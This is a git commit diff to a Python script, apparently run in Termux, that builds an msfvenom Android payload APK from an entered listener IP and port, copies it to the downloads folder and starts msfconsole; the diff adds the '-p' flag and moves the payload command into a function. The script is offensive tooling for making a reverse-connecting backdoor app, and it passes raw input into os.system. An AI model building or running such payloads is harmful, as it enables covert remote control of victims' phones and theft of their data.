ceb4068ed7c610703b18281587b70ba1f92dc322
Aditya <63653252+Adia12528@users.noreply.github.com>
2022-04-15 12:32:25 +0530

    Update payload_maker_tool.py

--- payload_maker_tool.py
+++ payload_maker_tool.py
@@ -10,11 +10,11 @@ print("select your inet-'ip address'.")
 lhost = input("Enter your ip address - ",)
 lport = input("Enter your port number - ",)
 apk_name = input("Enter apk name - ",)
-msfvenom_sentence = "msfvenom "+ Android_payload+ " lhost"+"="+lhost+ " lport"+ "="+ lport+" R> "+apk_name
-os.system(msfvenom_sentence)
+msfvenom_sentence = "msfvenom -p "+ Android_payload+ " lhost"+"="+lhost+ " lport"+ "="+ lport+" R> "+apk_name
 
 def payload():
     if Android_payload == "first":
+        os.system(msfvenom_sentence)
         os.system("cp "+apk_name+" /data/data/com.termux/files/home/storage/downloads")
         os.system("msfconsole")
     else:
